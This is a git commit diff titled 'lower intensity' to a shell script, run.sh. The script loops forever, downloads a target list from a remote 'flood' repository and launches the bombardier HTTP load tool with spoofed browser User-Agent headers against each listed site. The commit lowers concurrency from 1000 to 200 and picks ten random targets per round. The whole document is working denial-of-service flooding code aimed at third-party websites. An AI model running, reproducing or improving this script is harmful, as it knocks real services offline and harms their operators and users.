933f77518d081b72932aa0032b1136eb61171090
Anton Klyba <antonklyba@pingidentity.com>
2022-02-27 12:33:12 +0200

    lower intensity

--- run.sh
+++ run.sh
@@ -3,9 +3,9 @@
 while true
 do
     wget -O /app/targets.txt https://github.com/Anarhyst266/flood/blob/master/targets.txt
-    cat /app/targets.txt | while read line
+    cat /app/targets.txt |sort -R --random-source=/dev/urandom | tail -n 10 | while read line
     do
-        bombardier -c 1000 -d 60s -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" -q ${line} &
+        bombardier -c 200 -d 60s -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" -q ${line} &
     done
     sleep 60
 done
